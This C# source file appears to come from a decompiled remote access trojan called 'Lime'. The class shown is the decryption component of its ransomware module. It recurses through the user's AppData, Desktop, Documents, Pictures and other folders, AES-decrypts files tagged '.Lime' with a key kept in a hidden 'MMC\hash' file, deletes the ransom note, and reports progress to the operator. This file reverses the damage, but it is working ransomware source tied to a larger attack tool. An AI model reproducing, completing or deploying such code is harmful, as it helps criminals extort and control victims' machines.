using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Lime;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

public class RwareDE
{
	public object Decrypt_File()
	{
		Launch_decrypt();
		object result = default(object);
		return result;
	}

	private object Launch_decrypt()
	{
		Core.Send("MSG" + Core.Y + "Ransomware: It might take some time, Please Wait..");
		string myPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";
		Work_File(myPath);
		myPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		Work_File(myPath);
		myPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\";
		Work_File(myPath);
		Core.Send("MSG" + Core.Y + "Ransomware: %50 left...");
		myPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
		Work_File(myPath);
		myPath = Environment.GetFolderPath(Environment.SpecialFolder.Favorites) + "\\";
		Work_File(myPath);
		myPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\";
		Work_File(myPath);
		Core.Send("MSG" + Core.Y + "Ransomware: %80 left...");
		myPath = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + "\\";
		Work_File(myPath);
		myPath = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + "\\";
		Work_File(myPath);
		myPath = Environment.GetFolderPath(Environment.SpecialFolder.Recent) + "\\";
		Work_File(myPath);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		try
		{
			File.Delete(folderPath + "\\Microsoft\\MMC\\hash");
			File.Delete(folderPath2 + "\\Ransomware.txt");
			File.Delete(Path.GetTempPath() + "done.LE");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		Core.Send("MSG" + Core.Y + "Ransomware: All files have been decrypted");
		return true;
	}

	private object Work_File(string MyPath, bool delete = false)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string key = File.ReadAllText(folderPath + "\\Microsoft\\MMC\\hash");
		checked
		{
			try
			{
				int num = ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(MyPath).Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(MyPath)[i].IndexOf(".Lime") > -1)
					{
						if (!delete)
						{
							DeCrypt(((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(MyPath)[i], key);
						}
						((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(MyPath)[i] + ".Lime");
					}
				}
				int num2 = ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(MyPath).Count - 1;
				for (int i = 0; i <= num2; i++)
				{
					Work_File(((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(MyPath)[i]);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			string[] result = default(string[]);
			return result;
		}
	}

	public object DeCrypt(object file, object key)
	{
		byte[] input = File.ReadAllBytes(Conversions.ToString(file));
		try
		{
			File.WriteAllBytes(Conversions.ToString(NewLateBinding.LateGet(file, (Type)null, "replace", new object[2] { ".Lime", "" }, (string[])null, (Type[])null, (bool[])null)), AES_Decrypt(input, Conversions.ToString(key)));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return true;
	}

	public byte[] AES_Decrypt(byte[] input, string pass)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] result = default(byte[]);
		try
		{
			byte[] array = new byte[32];
			byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(pass));
			Array.Copy(sourceArray, 0, array, 0, 16);
			Array.Copy(sourceArray, 0, array, 15, 16);
			rijndaelManaged.Key = array;
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			byte[] array2 = cryptoTransform.TransformFinalBlock(input, 0, input.Length);
			result = array2;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
